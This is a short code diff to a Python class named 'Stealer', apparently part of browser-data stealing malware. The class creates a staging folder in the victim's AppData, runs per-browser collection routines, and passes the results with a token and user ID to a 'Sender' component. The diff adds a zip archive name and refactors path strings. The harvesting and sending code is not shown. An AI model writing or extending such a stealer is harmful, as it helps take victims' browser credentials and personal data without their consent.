@@ -19,6 +19,7 @@ class Stealer(Thread):
         self.user_id = user_id
 
         self.user = getuser()
+        self.zip_name = f"{self.user}-st"
         self.storage_path = f"C:/Users/{self.user}/AppData/"
         self.storage_folder = "files/"
 
@@ -45,14 +46,14 @@ class Stealer(Thread):
 
     def __create_storage(self):
 
-        if not path.exists(self.storage_path + "files/"):
+        if not path.exists(f"{self.storage_path}files/"):
 
-            mkdir(self.storage_path + "files/")
+            mkdir(f"{self.storage_path}files/")
 
         else:
 
-            rmtree(self.storage_path + "files/")
-            mkdir(self.storage_path + "files/")
+            rmtree(f"{self.storage_path}files/")
+            mkdir(f"{self.storage_path}files/")
 
     def run(self):
 
@@ -61,5 +62,5 @@ class Stealer(Thread):
         for browser in self.browsers:
             browser["method"].run()
 
-        sender = Sender(self.storage_path, self.storage_folder, self.token, self.user_id)
+        sender = Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id)
         sender.run()
